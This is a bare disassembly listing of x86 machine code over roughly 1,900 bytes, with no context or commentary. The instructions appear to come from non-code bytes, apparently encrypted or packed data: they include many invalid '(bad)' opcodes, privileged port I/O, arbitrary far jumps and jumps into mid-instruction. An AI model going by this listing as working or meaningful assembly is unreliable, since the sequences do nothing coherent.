  40ec7c:	push   esp
  40ec7d:	mov    esi,0xb3db35de
  40ec82:	mov    al,ds:0x1ab352f1
  40ec87:	ins    DWORD PTR es:[edi],dx
  40ec88:	call   0x9b666b46
  40ec8d:	(bad)  
  40ec8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec8f:	or     BYTE PTR [edi+0x7d65a7a6],ah
  40ec95:	out    dx,al
  40ec96:	enter  0x8cca,0x8a
  40ec9a:	xchg   ecx,eax
  40ec9b:	or     esp,esp
  40ec9d:	or     al,0x2
  40ec9f:	unpckhps xmm5,xmm6
  40eca2:	test   eax,0x5768d9ca
  40eca7:	test   DWORD PTR ds:0x501f2781,ebp
  40ecad:	and    al,0x96
  40ecaf:	loope  0x40ecf4
  40ecb1:	clc    
  40ecb2:	(bad)  
  40ecb3:	jb     0x40ed30
  40ecb5:	xchg   ecx,eax
  40ecb6:	push   0x56
  40ecb8:	jno    0x40ecc0
  40ecba:	ins    BYTE PTR es:[edi],dx
  40ecbb:	fcmovnbe st,st(2)
  40ecbd:	mov    ebp,0xf39f197d
  40ecc2:	jae    0x40ece8
  40ecc4:	sbb    al,0x7d
  40ecc6:	pushf  
  40ecc7:	or     WORD PTR [edi-0x4],0xffbb
  40eccc:	dec    ebp
  40eccd:	pop    ss
  40ecce:	inc    ebp
  40eccf:	dec    edx
  40ecd0:	add    eax,0xcb03a710
  40ecd5:	cmp    al,0x67
  40ecd7:	in     al,0x11
  40ecd9:	jae    0x40ed0d
  40ecdb:	mov    ch,0xb7
  40ecdd:	add    esp,DWORD PTR [esi]
  40ecdf:	or     DWORD PTR [ecx+0x248b2ece],esi
  40ece5:	loopne 0x40ed11
  40ece7:	aam    0x3
  40ece9:	xor    eax,0xf2e442c7
  40ecee:	rcl    bl,1
  40ecf0:	sub    al,0xa2
  40ecf2:	add    eax,0x5a9b4b67
  40ecf7:	loop   0x40ecfa
  40ecf9:	inc    ebx
  40ecfa:	mov    ah,0x11
  40ecfc:	fs cwde 
  40ecfe:	aas    
  40ecff:	mov    ebp,esi
  40ed01:	int3   
  40ed02:	inc    ebx
  40ed03:	or     al,BYTE PTR [ecx-0x5520e487]
  40ed09:	cs mov dl,0x16
  40ed0c:	aad    0xb2
  40ed0e:	jne    0x40ec94
  40ed10:	mov    dl,0xd5
  40ed12:	pop    esi
  40ed13:	stc    
  40ed14:	ins    BYTE PTR es:[edi],dx
  40ed15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed16:	mov    dh,0x14
  40ed18:	in     eax,dx
  40ed19:	or     BYTE PTR [ebp+esi*1+0x1b10c438],0x24
  40ed21:	or     al,0x12
  40ed23:	and    al,0x97
  40ed25:	clc    
  40ed26:	fucomp st(0)
  40ed28:	push   edi
  40ed29:	push   0xffbd30c7
  40ed2e:	clc    
  40ed2f:	mov    eax,gs:0x71d32ebb
  40ed35:	dec    ebp
  40ed36:	adc    BYTE PTR [ebp+0x3328538a],al
  40ed3c:	scas   al,BYTE PTR es:[edi]
  40ed3d:	add    DWORD PTR [edx],esi
  40ed3f:	jae    0x40ed8a
  40ed41:	mov    DWORD PTR es:[ecx+0x3],esi
  40ed45:	(bad)  
  40ed46:	fisttp DWORD PTR [ebx+0x21]
  40ed49:	repnz inc ecx
  40ed4b:	aas    
  40ed4c:	rol    bh,cl
  40ed4e:	push   edi
  40ed4f:	outs   dx,DWORD PTR ds:[esi]
  40ed50:	fwait
  40ed51:	stos   BYTE PTR es:[edi],al
  40ed52:	scas   al,BYTE PTR es:[edi]
  40ed53:	inc    ecx
  40ed54:	fild   QWORD PTR [edx-0x26de9519]
  40ed5a:	mov    dl,0xdf
  40ed5c:	stos   DWORD PTR es:[edi],eax
  40ed5d:	aad    0xc3
  40ed5f:	xor    al,0x76
  40ed61:	sbb    al,0x78
  40ed63:	sub    ch,0x9e
  40ed66:	(bad)
  40ed69:	addr16 pop edx
  40ed6b:	mov    cl,0x1f
  40ed6d:	and    al,BYTE PTR [esi+0x77394a6b]
  40ed73:	push   eax
  40ed74:	mov    cs,WORD PTR [eax-0x5b]
  40ed77:	popf   
  40ed78:	in     eax,dx
  40ed79:	push   edx
  40ed7a:	(bad)  [esi]
  40ed7c:	repz fwait
  40ed7e:	xor    eax,0xdaafd4f6
  40ed83:	arpl   WORD PTR [edi+0x41],dx
  40ed86:	popf   
  40ed87:	pop    DWORD PTR [edx-0x12]
  40ed8a:	xor    eax,0xf44921e5
  40ed8f:	test   BYTE PTR [ebx-0x50],ah
  40ed92:	daa    
  40ed93:	das    
  40ed94:	cmp    bh,dh
  40ed96:	mov    ah,0x72
  40ed98:	dec    esp
  40ed99:	fisub  DWORD PTR [ebp+0x5f50de6f]
  40ed9f:	outs   dx,DWORD PTR ds:[esi]
  40eda0:	or     DWORD PTR [eax+0x4c],eax
  40eda3:	xchg   BYTE PTR [eax+eax*8-0x7f29b042],dh
  40edaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edab:	mov    eax,ds:0x3e4c0623
  40edb0:	stos   DWORD PTR es:[edi],eax
  40edb1:	cmp    al,0x9f
  40edb3:	stos   DWORD PTR es:[edi],eax
  40edb4:	inc    edx
  40edb5:	hlt    
  40edb6:	push   es
  40edb7:	fcomp  QWORD PTR ss:[ebp+eiz*2-0x1a545de7]
  40edbf:	ret    0x4bb
  40edc2:	popa   
  40edc3:	sbb    BYTE PTR [ebx],cl
  40edc5:	adc    al,0x14
  40edc7:	or     dh,BYTE PTR [edi+eax*2+0x26]
  40edcb:	int3   
  40edcc:	loopne 0x40edce
  40edce:	ja     0x40ee4b
  40edd0:	jo     0x40ee46
  40edd2:	in     al,0xc
  40edd4:	dec    ebx
  40edd5:	mov    BYTE PTR [ebx+0x336c1b82],ch
  40eddb:	ss sbb eax,0xde7f75ce
  40ede1:	xchg   ebp,eax
  40ede2:	inc    edx
  40ede3:	icebp  
  40ede4:	add    BYTE PTR [edi+0x1d6b0c16],ah
  40edea:	ss (bad) 
  40edec:	pushf  
  40eded:	mov    cl,0x9d
  40edef:	mov    ecx,0x8089daae
  40edf4:	call   0xa1bc4983
  40edf9:	adc    DWORD PTR [ecx],ecx
  40edfb:	nop
  40edfc:	leave  
  40edfd:	mov    ecx,0xfa5195e2
  40ee02:	and    DWORD PTR [edx+esi*4-0x47],0xffffff8b
  40ee07:	hlt    
  40ee08:	push   eax
  40ee09:	and    al,0xee
  40ee0b:	pop    edx
  40ee0c:	pop    es
  40ee0d:	push   0xc9dbd684
  40ee12:	pop    eax
  40ee13:	int3   
  40ee14:	jmp    DWORD PTR [ebp-0x1d]
  40ee17:	jns    0x40ee35
  40ee19:	pop    ecx
  40ee1a:	(bad)  [ecx*8+0x75a0df75]
  40ee21:	iret   
  40ee22:	inc    ebx
  40ee23:	cwde   
  40ee24:	je     0x40eda7
  40ee26:	or     DWORD PTR [esi],eax
  40ee28:	out    0x45,al
  40ee2a:	idiv   BYTE PTR [ecx]
  40ee2c:	and    esp,ebx
  40ee2e:	and    DWORD PTR [ebp+0x430a0e36],ebp
  40ee34:	pop    ecx
  40ee35:	loope  0x40ee31
  40ee37:	cmp    ch,BYTE PTR [ebx]
  40ee39:	pop    es
  40ee3a:	jne    0x40edef
  40ee3c:	hlt    
  40ee3d:	pop    ebp
  40ee3e:	mov    DWORD PTR ds:0x56bb8b60,ebp
  40ee44:	dec    ecx
  40ee45:	jp     0x40ee59
  40ee47:	shl    bl,1
  40ee49:	pop    esi
  40ee4a:	inc    esp
  40ee4b:	pop    ss
  40ee4c:	inc    eax
  40ee4d:	jno    0x40ee9f
  40ee4f:	mov    ah,0xd1
  40ee51:	sub    BYTE PTR [esi-0x60],0xe3
  40ee55:	dec    edx
  40ee56:	inc    esi
  40ee57:	popf   
  40ee58:	daa    
  40ee59:	(bad)  
  40ee5a:	adc    BYTE PTR [ecx+0x4e],ah
  40ee5d:	cmp    edx,esp
  40ee5f:	mov    ds:0x1c923730,eax
  40ee64:	add    DWORD PTR [edx],edi
  40ee66:	push   esp
  40ee67:	cld    
  40ee68:	xlat   BYTE PTR ds:[ebx]
  40ee69:	or     DWORD PTR [ebx-0x78],0xe6e58836
  40ee70:	xlat   BYTE PTR ds:[ebx]
  40ee71:	aad    0xfa
  40ee73:	sub    dl,BYTE PTR [esp+esi*4-0x4f]
  40ee77:	mov    edx,0x80ad8ce0
  40ee7c:	in     eax,dx
  40ee7d:	mov    bl,bl
  40ee7f:	icebp  
  40ee80:	push   esp
  40ee81:	pop    ecx
  40ee82:	nop
  40ee83:	or     al,0x63
  40ee85:	sub    edi,DWORD PTR [edx]
  40ee87:	movlps QWORD PTR [ebx-0x7d873588],xmm1
  40ee8e:	je     0x40ee73
  40ee90:	in     al,0x25
  40ee92:	mov    ecx,0x43197927
  40ee97:	cmp    al,0xf9
  40ee99:	inc    ebp
  40ee9a:	jnp    0x40eeda
  40ee9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee9d:	pop    ebp
  40ee9e:	adc    DWORD PTR [ebx],edi
  40eea0:	add    eax,0x7fc52e01
  40eea5:	mov    eax,ds:0x45d91d27
  40eeaa:	jecxz  0x40ee8b
  40eeac:	sub    esp,DWORD PTR [eax+0x6]
  40eeaf:	add    al,0xf4
  40eeb1:	pop    edx
  40eeb2:	into   
  40eeb3:	xor    DWORD PTR [esi-0x11157f29],edx
  40eeb9:	call   0xc204:0xeb8a6a49
  40eec0:	cdq    
  40eec1:	add    bl,BYTE PTR [edi+0x9173c8d]
  40eec7:	stc    
  40eec8:	push   edi
  40eec9:	fadd   st,st(5)
  40eecb:	and    eax,DWORD PTR [eax+0x4ba70996]
  40eed1:	jl     0x40ef2b
  40eed3:	xor    al,0xca
  40eed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed6:	push   esi
  40eed7:	xchg   ebp,eax
  40eed8:	dec    ebx
  40eed9:	add    BYTE PTR [eax+0x32],0x26
  40eedd:	mov    eax,ds:0x5901b445
  40eee2:	sub    dl,al
  40eee4:	test   ebp,esp
  40eee6:	fwait
  40eee7:	mov    cs,eax
  40eee9:	js     0x40eec1
  40eeeb:	push   0x69d21260
  40eef0:	or     BYTE PTR [eax+ebx*8],dh
  40eef3:	and    BYTE PTR [esi+0x5e3a9cc0],bl
  40eef9:	mov    dl,0x90
  40eefb:	adc    ah,ah
  40eefd:	jecxz  0x40ee92
  40eeff:	ret    0x8745
  40ef02:	pop    edi
  40ef03:	push   esi
  40ef04:	or     al,0x8b
  40ef06:	jbe    0x40eecd
  40ef08:	jnp    0x40ef53
  40ef0a:	dec    edi
  40ef0b:	aaa    
  40ef0c:	ret    0x7199
  40ef0f:	arpl   WORD PTR [edx],bp
  40ef11:	dec    ebx
  40ef12:	(bad)  
  40ef13:	push   0x42b7f660
  40ef18:	xchg   ecx,eax
  40ef19:	add    ecx,DWORD PTR [edi-0x56404a04]
  40ef1f:	mov    esp,0xa1602084
  40ef24:	fimul  WORD PTR [eax-0x597c26e2]
  40ef2a:	mov    al,0xbf
  40ef2c:	je     0x40eeed
  40ef2e:	stos   DWORD PTR es:[edi],eax
  40ef2f:	cwde   
  40ef30:	push   0x63
  40ef32:	out    dx,al
  40ef33:	aaa    
  40ef34:	cs dec edx
  40ef36:	stc    
  40ef37:	lods   al,BYTE PTR ds:[esi]
  40ef38:	into   
  40ef39:	cmp    eax,0x85da2a05
  40ef3e:	sub    bh,BYTE PTR [ecx+0x76]
  40ef41:	mov    DWORD PTR [eax],0x62cc5bee
  40ef47:	mov    ecx,DWORD PTR [esi+0x5b]
  40ef4a:	dec    esp
  40ef4b:	(bad)  
  40ef4c:	mov    ds,WORD PTR [edi+0x52]
  40ef4f:	xchg   esp,eax
  40ef50:	outs   dx,DWORD PTR ds:[esi]
  40ef51:	in     eax,dx
  40ef52:	jno    0x40ef76
  40ef54:	lods   al,BYTE PTR ds:[esi]
  40ef55:	stos   DWORD PTR es:[edi],eax
  40ef56:	outs   dx,DWORD PTR ds:[esi]
  40ef57:	xor    esp,DWORD PTR [ebx]
  40ef59:	(bad)  
  40ef5a:	loop   0x40efc9
  40ef5c:	sub    ebx,DWORD PTR [ebx+0x111b0f63]
  40ef62:	jge    0x40ef5a
  40ef64:	xor    al,0x26
  40ef66:	js     0x40eef3
  40ef68:	shl    ah,1
  40ef6a:	sub    eax,0x62c6e1ec
  40ef6f:	inc    eax
  40ef70:	xchg   BYTE PTR [ecx+0xd],ch
  40ef73:	inc    ebp
  40ef74:	sti    
  40ef75:	sub    bl,BYTE PTR [ebp+0x2005ad1a]
  40ef7b:	or     al,0x37
  40ef7d:	or     DWORD PTR [eax+0x3f],ecx
  40ef80:	xchg   esi,eax
  40ef81:	ins    BYTE PTR es:[edi],dx
  40ef82:	or     ecx,DWORD PTR [edi+0x71]
  40ef85:	xor    BYTE PTR [eax+ebx*1-0x51b025ce],bl
  40ef8c:	push   edi
  40ef8d:	xlat   BYTE PTR ds:[ebx]
  40ef8e:	jmp    0x1044:0x979df1a4
  40ef95:	fistp  WORD PTR [ebx-0x360622f]
  40ef9b:	sub    ebp,DWORD PTR [esi+0x19]
  40ef9e:	in     al,dx
  40ef9f:	call   0xd2e40586
  40efa4:	pop    ecx
  40efa5:	sub    dh,dh
  40efa7:	mov    ebp,0xcd0aeef6
  40efac:	mov    al,ds:0xe3bcf153
  40efb1:	in     eax,dx
  40efb2:	aas    
  40efb3:	pushw  es
  40efb5:	sbb    DWORD PTR [ecx-0x79f1201d],edx
  40efbb:	push   ss
  40efbc:	imul   ebx,esp,0x38
  40efbf:	and    al,0x94
  40efc1:	push   edx
  40efc2:	push   ss
  40efc3:	shl    BYTE PTR [esi-0x203cd254],0xb3
  40efca:	sbb    al,BYTE PTR [edi-0x45fb941e]
  40efd0:	mov    edi,0x61156fbc
  40efd5:	in     eax,0xa9
  40efd7:	add    DWORD PTR [edi],esi
  40efd9:	gs dec ecx
  40efdb:	dec    edi
  40efdc:	jg     0x40efc1
  40efde:	sub    esp,DWORD PTR [esi+0x2b]
  40efe1:	jl     0x40f00d
  40efe3:	es (bad) 
  40efe5:	push   edi
  40efe6:	arpl   WORD PTR [eax+0x7997cd91],sp
  40efec:	popf   
  40efed:	outs   dx,BYTE PTR ds:[esi]
  40efee:	retf   
  40efef:	and    cl,bh
  40eff1:	mov    al,ds:0xad8023df
  40eff6:	mov    BYTE PTR [esi+0x550a6513],al
  40effc:	add    BYTE PTR [eax-0x3e],al
  40efff:	dec    ebp
  40f000:	(bad)  
  40f001:	push   edx
  40f002:	adc    BYTE PTR [eax+0x1cf7061b],dh
  40f008:	adc    ecx,DWORD PTR [edi+0x5c]
  40f00b:	shl    BYTE PTR [ebx],cl
  40f00d:	push   ebp
  40f00e:	pop    esi
  40f00f:	add    DWORD PTR [ecx],ecx
  40f011:	mov    esp,0x7dd4cc52
  40f016:	mov    ecx,0x238de5cd
  40f01b:	js     0x40f03a
  40f01d:	inc    esp
  40f01e:	call   0x8a34:0x4176e806
  40f025:	repz ror DWORD PTR [ebp+0x16],cl
  40f029:	sub    eax,0x61d57c0b
  40f02e:	adc    eax,0x13d286c3
  40f033:	scas   eax,DWORD PTR es:[edi]
  40f034:	ins    BYTE PTR es:[edi],dx
  40f035:	fmul   DWORD PTR [edx+esi*2]
  40f038:	push   ebp
  40f039:	mov    dl,0x74
  40f03b:	les    esi,FWORD PTR [ebp-0x1572902f]
  40f041:	mov    eax,0x5679bae
  40f046:	push   ecx
  40f047:	aaa    
  40f048:	mov    esp,0xcf5f1bb7
  40f04d:	sub    ch,BYTE PTR [edx-0x594c4c64]
  40f053:	jmp    0x6a80bbbc
  40f058:	(bad)  
  40f059:	sbb    al,0x2f
  40f05b:	pushf  
  40f05c:	jns    0x40f00f
  40f05e:	ds or  eax,ecx
  40f061:	jp     0x40f0af
  40f063:	and    eax,0xb68970f
  40f068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f069:	inc    ebp
  40f06a:	inc    edx
  40f06b:	xchg   ebp,eax
  40f06c:	xor    eax,0x3d6105be
  40f071:	mov    bh,0xc8
  40f073:	(bad)  
  40f074:	jge    0x40f0d1
  40f076:	and    eax,0xd5ad76e3
  40f07b:	in     al,dx
  40f07c:	mov    cl,cl
  40f07e:	in     al,0x72
  40f080:	pop    ecx
  40f081:	cmp    ecx,DWORD PTR [eax-0x73]
  40f084:	pop    ebp
  40f085:	pop    eax
  40f086:	lock adc ecx,DWORD PTR [ebx+0x5b5b74bb]
  40f08d:	push   edi
  40f08e:	push   es
  40f08f:	xchg   BYTE PTR [eax-0x3d6d00c1],bh
  40f095:	mul    DWORD PTR [esi-0x6eb4dee4]
  40f09b:	xor    DWORD PTR [edx+0x3a],0xffffffca
  40f09f:	rcl    edx,cl
  40f0a1:	fisub  WORD PTR [esi]
  40f0a3:	sbb    BYTE PTR [edi-0x43799ec4],ch
  40f0a9:	fldlg2 
  40f0ab:	fwait
  40f0ac:	and    al,0xa6
  40f0ae:	out    dx,al
  40f0af:	jecxz  0x40f035
  40f0b1:	cmc    
  40f0b2:	repz test BYTE PTR [edi+0x6c0174ec],0x1
  40f0ba:	out    dx,eax
  40f0bb:	(bad)  
  40f0bc:	add    al,0x68
  40f0be:	push   ds
  40f0bf:	and    al,0x94
  40f0c1:	mov    al,0x3a
  40f0c3:	or     ebp,0xd26aa41e
  40f0c9:	or     al,0xe
  40f0cb:	push   edx
  40f0cc:	test   eax,0xc8327efa
  40f0d1:	sub    eax,0x79e28627
  40f0d6:	jecxz  0x40f090
  40f0d8:	into   
  40f0d9:	sar    DWORD PTR [esi+0x5eb5eaea],cl
  40f0df:	pop    edx
  40f0e0:	ja     0x40f161
  40f0e2:	scas   eax,DWORD PTR es:[edi]
  40f0e3:	fld    QWORD PTR [ebx+0x584e40ed]
  40f0e9:	add    cl,ch
  40f0eb:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f0ed:	dec    eax
  40f0ee:	iret   
  40f0ef:	push   edx
  40f0f0:	and    al,0x4a
  40f0f2:	adc    eax,0x12964b19
  40f0f7:	add    bl,BYTE PTR [ecx+0xf29deb0]
  40f0fd:	sbb    DWORD PTR ds:0xd94835dc,esi
  40f103:	adc    eax,0xd8c2b93b
  40f108:	push   cs
  40f109:	mov    ds:0x4ba02b08,eax
  40f10e:	lahf   
  40f10f:	lock fmul QWORD PTR [ebx+0x58ad6e28]
  40f116:	xchg   esi,eax
  40f117:	mov    esp,0xe4bf1afc
  40f11c:	retf   
  40f11d:	aad    0x98
  40f11f:	xchg   edx,eax
  40f120:	mov    al,ds:0x7063faae
  40f125:	sub    al,0x67
  40f127:	mov    al,ds:0xad7d9885
  40f12c:	inc    esp
  40f12d:	mov    esp,DWORD PTR [esi+0x50b47b17]
  40f133:	pop    eax
  40f134:	pop    ebp
  40f135:	jmp    0x34d22f9c
  40f13a:	ficomp DWORD PTR [esi]
  40f13c:	call   0xdc4fb5f2
  40f141:	mov    bl,0xe
  40f143:	and    BYTE PTR [edx+0xbc7d23c],al
  40f149:	xchg   esp,eax
  40f14a:	dec    ecx
  40f14b:	jp     0x40f1a5
  40f14d:	add    DWORD PTR fs:[edi-0x5ad8363f],esi
  40f154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f155:	adc    DWORD PTR es:[esi-0x5da1eea5],0x2c
  40f15d:	adc    DWORD PTR ds:0xd475ee13,ebx
  40f163:	scas   al,BYTE PTR es:[edi]
  40f164:	dec    edi
  40f165:	add    DWORD PTR [ebp-0x7f9ab211],0xbc55cfde
  40f16f:	and    al,0x59
  40f171:	fdivr  DWORD PTR [eax-0x75]
  40f174:	push   ds
  40f175:	xor    dh,BYTE PTR [bp+si+0x4a17]
  40f17a:	push   eax
  40f17b:	in     eax,0xae
  40f17d:	mov    ds:0xb61dfd5a,eax
  40f182:	pop    ss
  40f183:	cld    
  40f184:	add    DWORD PTR [ebp+0x3de7e6d2],ebx
  40f18a:	outs   dx,BYTE PTR ds:[esi]
  40f18b:	dec    ebp
  40f18c:	pop    ebx
  40f18d:	in     al,0xcc
  40f18f:	shl    BYTE PTR ds:0x25c51593,1
  40f195:	stos   BYTE PTR es:[edi],al
  40f196:	pusha  
  40f197:	dec    esi
  40f198:	ss cwde 
  40f19a:	das    
  40f19b:	fsubr  DWORD PTR ds:0x8dc11e5c
  40f1a1:	inc    esp
  40f1a2:	mov    al,ds:0xc6d5b318
  40f1a7:	jg     0x40f211
  40f1a9:	mov    bl,0xe
  40f1ab:	ss scas eax,DWORD PTR es:[edi]
  40f1ad:	test   BYTE PTR [esi-0x6293834c],ch
  40f1b3:	imul   edx,DWORD PTR [edx+0x2e41f41f],0x2f
  40f1ba:	fcmovu st,st(6)
  40f1bc:	pop    edx
  40f1bd:	jp     0x40f1fb
  40f1bf:	sbb    eax,0x38dc91f5
  40f1c5:	xor    DWORD PTR [edx],ecx
  40f1c7:	enter  0xb73d,0x2a
  40f1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1cc:	aas    
  40f1cd:	push   es
  40f1ce:	test   eax,0xecf9f2a6
  40f1d3:	inc    ecx
  40f1d4:	imul   ebx,DWORD PTR [ebx+eax*4-0x58],0xffffffb0
  40f1d9:	cdq    
  40f1da:	jmp    0x40f22a
  40f1dc:	add    bl,ah
  40f1de:	push   eax
  40f1df:	or     DWORD PTR [esi-0x50],ecx
  40f1e2:	xchg   esi,eax
  40f1e3:	push   ds
  40f1e4:	cli    
  40f1e5:	jno    0x40f232
  40f1e7:	call   0x8324:0xce97dc22
  40f1ee:	push   ebx
  40f1ef:	cmp    BYTE PTR [ecx-0x7a4c2028],ch
  40f1f5:	push   es
  40f1f6:	jne    0x40f1c5
  40f1f8:	pop    ds
  40f1f9:	mov    al,0xf2
  40f1fb:	sub    ecx,DWORD PTR [ebp+0x4f]
  40f1fe:	sub    al,0xb4
  40f200:	pcmpeqw mm7,QWORD PTR [ebx+0x4e]
  40f204:	popf   
  40f205:	fwait
  40f206:	add    al,bh
  40f208:	mov    edx,edx
  40f20a:	push   es
  40f20b:	xchg   ecx,eax
  40f20c:	ja     0x40f1ab
  40f20e:	xchg   ebp,eax
  40f20f:	pop    ds
  40f210:	jmp    0xdecb86f5
  40f215:	jbe    0x40f295
  40f217:	mov    gs,WORD PTR [edi-0x6e]
  40f21a:	(bad)  
  40f21c:	cmp    eax,0xcfabcc89
  40f221:	or     eax,DWORD PTR [edi]
  40f223:	loop   0x40f289
  40f225:	cmp    ah,cl
  40f227:	or     BYTE PTR [ecx+eiz*2-0x629041c3],ah
  40f22e:	adc    BYTE PTR [ebx-0x59d4c0d4],cl
  40f234:	adc    al,0x24
  40f236:	(bad)  
  40f237:	jge    0x40f286
  40f239:	in     eax,dx
  40f23a:	jae    0x40f253
  40f23c:	cld    
  40f23d:	ret    
  40f23e:	les    edx,FWORD PTR [ecx+0x3b380e00]
  40f244:	sar    DWORD PTR [eax],cl
  40f246:	shr    DWORD PTR [esi+0x7dc6fc26],0x84
  40f24d:	jmp    0xb1a2:0x1766b350
  40f254:	xor    al,0xd1
  40f256:	push   0x2079ddc3
  40f25b:	or     eax,0x825f889d
  40f260:	push   0xdc592aed
  40f265:	inc    esi
  40f266:	cmp    al,BYTE PTR [esi-0x5f]
  40f269:	mov    esp,0x1dfd7423
  40f26e:	cmc    
  40f26f:	add    ebx,DWORD PTR [esp+esi*1-0x10]
  40f273:	stos   DWORD PTR es:[edi],eax
  40f274:	pop    eax
  40f275:	jge    0x40f24f
  40f277:	adc    ebx,DWORD PTR [eax-0x7f]
  40f27a:	nop    ecx
  40f27d:	call   0xe7b19d87
  40f282:	push   esp
  40f283:	fisub  WORD PTR ds:0xa18b2049
  40f289:	adc    ch,bh
  40f28b:	repnz ins BYTE PTR es:[edi],dx
  40f28d:	je     0x40f26f
  40f28f:	out    dx,al
  40f290:	ficom  DWORD PTR [edi]
  40f292:	or     ebp,DWORD PTR [ecx+0x42]
  40f295:	inc    cl
  40f297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f298:	hlt    
  40f299:	or     esp,ebx
  40f29b:	retf   
  40f29c:	hlt    
  40f29d:	jnp    0x40f2c7
  40f29f:	(bad)  
  40f2a0:	inc    eax
  40f2a1:	cld    
  40f2a2:	imul   ecx,DWORD PTR [edx+edi*2],0xee66866a
  40f2a9:	pusha  
  40f2aa:	fcmovnbe st,st(4)
  40f2ac:	add    ebx,edi
  40f2ae:	xor    edi,edx
  40f2b0:	fs sbb al,0x52
  40f2b4:	jno    0x40f2de
  40f2b6:	retf   
  40f2b7:	xchg   ebx,eax
  40f2b8:	jecxz  0x40f275
  40f2ba:	sti    
  40f2bb:	xchg   ebp,eax
  40f2bc:	sub    esi,DWORD PTR [edi]
  40f2be:	in     al,dx
  40f2bf:	ds ins DWORD PTR es:[edi],dx
  40f2c1:	in     eax,dx
  40f2c2:	jne    0x4c6a00d0
  40f2c8:	lds    esi,FWORD PTR [esi-0x65]
  40f2cb:	arpl   sp,bx
  40f2cd:	test   al,0xac
  40f2cf:	or     DWORD PTR [ecx+0x4d],esi
  40f2d2:	mov    dh,0x4f
  40f2d4:	xor    DWORD PTR [eax-0x1b],esp
  40f2d7:	int    0xc9
  40f2d9:	jbe    0x40f25d
  40f2db:	cld    
  40f2dc:	aas    
  40f2dd:	das    
  40f2de:	mov    ebx,0xed1cf47b
  40f2e3:	xor    al,0x28
  40f2e5:	jmp    0x41fe:0xab789fba
  40f2ec:	xchg   esp,eax
  40f2ed:	mov    al,BYTE PTR [ebx]
  40f2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2f0:	scas   eax,DWORD PTR es:[edi]
  40f2f1:	push   ebp
  40f2f2:	pusha  
  40f2f3:	cmp    cl,BYTE PTR [edi+ecx*8-0x31]
  40f2f7:	(bad)  
  40f2f8:	mov    ah,0xba
  40f2fa:	jle    0x40f313
  40f2fc:	lods   al,BYTE PTR ds:[esi]
  40f2fd:	dec    ecx
  40f2fe:	mov    DWORD PTR [edx-0x7f8b0e7],ebp
  40f304:	ins    BYTE PTR es:[edi],dx
  40f305:	out    0x6c,al
  40f307:	(bad)  
  40f308:	sbb    al,0x3f
  40f30a:	add    dh,al
  40f30c:	aad    0x90
  40f30e:	cmp    ch,0x20
  40f311:	sbb    eax,0xba969ca0
  40f316:	out    0x21,eax
  40f318:	mov    cl,0x7c
  40f31a:	ss (bad) 
  40f31c:	rcl    DWORD PTR [esi],1
  40f31e:	stos   BYTE PTR es:[edi],al
  40f31f:	jmp    0xfc1c:0xb50fcc05
  40f326:	out    dx,eax
  40f327:	inc    esi
  40f328:	mov    ch,0x3f
  40f32a:	mov    edi,0x61068b67
  40f32f:	mov    al,ds:0xbdf8054a
  40f334:	fwait
  40f335:	les    esp,FWORD PTR [ebx-0x25bc3f18]
  40f33b:	dec    edi
  40f33c:	aam    0x10
  40f33e:	fs out 0x6a,al
  40f341:	xchg   edi,ebx
  40f343:	cmp    ebx,ebp
  40f345:	(bad)  
  40f347:	fs ins DWORD PTR es:[edi],dx
  40f349:	cmp    DWORD PTR [esi-0x2],esi
  40f34c:	mov    dl,0x56
  40f34e:	pushf  
  40f34f:	xchg   ecx,eax
  40f350:	js     0x40f2de
  40f352:	add    ebx,esi
  40f354:	std    
  40f355:	sub    al,BYTE PTR [eax+0x1ff697a0]
  40f35b:	jmp    0xd615:0x80b3fb17
  40f362:	out    0x6f,eax
  40f364:	xlat   BYTE PTR ds:[ebx]
  40f365:	lahf   
  40f366:	push   cs
  40f367:	sbb    BYTE PTR [ebp+ecx*4-0x52],cl
  40f36b:	(bad)  
  40f36c:	and    eax,0x92f126f7
  40f371:	test   ebp,0x93dc6900
  40f377:	xlat   BYTE PTR ds:[ebx]
  40f378:	jnp    0x40f2fa
  40f37a:	ja     0x40f382
  40f37c:	scas   eax,DWORD PTR es:[edi]
  40f37d:	sbb    eax,0x39c05b00
  40f382:	cli    
  40f383:	(bad)  
  40f384:	xlat   BYTE PTR ds:[ebx]
  40f385:	mov    eax,ds:0xc42af7da
  40f38a:	lods   eax,DWORD PTR ds:[esi]
  40f38b:	adc    BYTE PTR [edx-0x66],0x96
  40f38f:	pop    ebx
  40f390:	shr    ch,0xb8
  40f393:	adc    dh,dh
  40f395:	int    0xd7
  40f397:	adc    ch,ch
  40f399:	cmp    BYTE PTR [ecx],0x9a
  40f39c:	mov    dh,dl
  40f39e:	fcmove st,st(2)
  40f3a0:	repz mov eax,DWORD PTR [eax+0x50]
  40f3a4:	lea    edx,[edx]
  40f3a6:	(bad)  
  40f3a8:	add    DWORD PTR [ebp+0x31],eax
  40f3ab:	mov    BYTE PTR [edi+0x3dcdaa64],bh
  40f3b1:	xor    al,0x8b
  40f3b3:	push   ss
  40f3b4:	add    eax,DWORD PTR [ebx]
  40f3b6:	xchg   edx,eax
  40f3b7:	cli    
  40f3b8:	mov    cl,0xbd
  40f3ba:	mov    dl,0x17
  40f3bc:	xchg   esp,eax
  40f3bd:	jge    0x40f3db
  40f3bf:	lahf   
  40f3c0:	push   ds
  40f3c1:	mov    dh,0x1a
  40f3c3:	cmp    DWORD PTR [edx-0x6db30543],0xffffffb9
  40f3ca:	jno    0x40f37b
  40f3cc:	cmp    BYTE PTR [ebx-0x42],dh
  40f3cf:	into   
  40f3d0:	dec    ebp
  40f3d1:	pop    edi
  40f3d2:	adc    BYTE PTR [edx],dh
  40f3d4:	dec    ecx
  40f3d5:	mov    ?,ebp
  40f3d7:	push   0xfb923606
  40f3dc:	xor    eax,0xea00102e
  40f3e1:	fcmovne st,st(2)
  40f3e3:	stc    
  40f3e4:	jp     0x40f40e
  40f3e6:	jle    0x40f3c0
  40f3e8:	std    
